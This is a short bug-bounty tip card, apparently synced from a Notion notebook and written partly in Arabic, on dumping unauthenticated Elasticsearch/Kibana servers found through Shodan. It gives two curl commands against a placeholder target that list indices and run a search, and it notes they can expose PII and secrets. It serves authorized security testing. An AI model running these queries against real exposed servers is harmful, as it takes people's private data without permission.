# Elasticsearch / Kibana open (no auth) → full data dump

**Rating:** 🔥 قوية  
**Category:** Recon  
**Status:** Not started  

## How It Works

من Shodan أو port 9200/5601. جرب /_cat/indices أو /_search. لو مفيش auth، اقدر تسحب كل الـ indices (PII، logs، secrets).

## Payload / Code

```
curl http://target:9200/_cat/indices
curl http://target:9200/_search?pretty
```

## Source

elasticpwn tool + Shodan common findings

---

_Synced from Notion: Bug Bounty Tips and Tricks. Authorized testing only._
